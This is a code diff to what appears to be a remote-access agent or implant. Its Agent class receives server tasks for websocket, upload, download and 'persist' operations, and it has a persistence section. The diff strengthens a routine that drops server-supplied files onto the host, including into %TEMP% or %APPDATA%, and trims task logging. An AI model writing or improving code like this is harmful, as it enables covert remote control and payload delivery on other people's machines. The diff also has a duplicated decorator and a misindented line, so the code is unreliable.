@@ -1731,17 +1731,30 @@ class SystemUtils:
             return {{"error": str(e)}}
 
     @staticmethod
+    @staticmethod
     def download_file(filename, data, folder=None):
         try:
+            # Handle potential Data URL prefix (e.g., data:image/png;base64,...)
+            if isinstance(data, str) and ',' in data:
+                data = data.split(',')[1]
+            
+            # Ensure data is stripped of whitespace which can break b64decode
+            if isinstance(data, str):
+                data = data.strip()
+
             file_data = base64.b64decode(data)
 
             # Use provided folder or default to Downloads
-            if folder:
+            if folder and folder.strip():
                 target_dir = folder
             else:
-                target_dir = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
+                user_profile = os.getenv('USERPROFILE')
+                if user_profile:
+                    target_dir = os.path.join(user_profile, 'Downloads')
+                else:
+                    target_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
 
-            # Expand environment variables in folder path
+            # Expand environment variables (e.g. %TEMP% or %APPDATA%)
             target_dir = os.path.expandvars(target_dir)
 
             # Create directory if it doesn't exist
@@ -1750,18 +1763,19 @@ class SystemUtils:
 
             filepath = os.path.join(target_dir, filename)
 
+            # Avoid overwriting existing files by appending a counter
             counter = 1
             while os.path.exists(filepath):
                 name, ext = os.path.splitext(filename)
-                filepath = os.path.join(target_dir, f"{{name}}_{{counter}}{{ext}}")
+                filepath = os.path.join(target_dir, f'{{name}}_{{counter}}{{ext}}')
                 counter += 1
 
-            with open(filepath, "wb") as f:
+            with open(filepath, 'wb') as f:
                 f.write(file_data)
 
-            return {{"status": "success", "path": filepath}}
+            return {{'status': 'success', 'path': filepath, 'size': len(file_data)}}
         except Exception as e:
-            return {{"error": str(e)}}
+            return {{'status': 'error', 'message': str(e)}}
 
 # ======================
 # Persistence
@@ -3438,7 +3452,14 @@ class Agent:
                 self._executed_task_ids.add(task_id_str)
 
             task_type = task.get("type")
-            self._log_info(f"Received task: {{json.dumps(task, indent=2)}}")
+                        # Log task without dumping huge binary data
+            try:
+                log_task = task.copy()
+                if 'data' in log_task and isinstance(log_task['data'], str) and len(log_task['data']) > 500:
+                    log_task['data'] = f"<Binary Data: {{len(log_task['data'])}} bytes>"
+                self._log_info(f"Received task: {{json.dumps(log_task, indent=2)}}")
+            except:
+                self._log_info(f"Received task type: {{task_type}}")
             
             # Handle different task types from web interface
             if task_type == "websocket":
@@ -3733,10 +3754,15 @@ class Agent:
                 return SystemUtils.upload_file(task.get("path", ""))
             
             elif task_type == "download":
+                # The server wraps filename/data inside task[\'data\']
+                task_info = task.get("data", {{}})
+                if not isinstance(task_info, dict):
+                    task_info = task
+                
                 return SystemUtils.download_file(
-                    task.get("filename", ""),
-                    task.get("data", ""),
-                    task.get("folder", None))
+                    task_info.get("filename", ""),
+                    task_info.get("data", ""),
+                    task_info.get("folder", None))
             
             elif task_type == "persist":
                 self._log_info("Installing persistence")
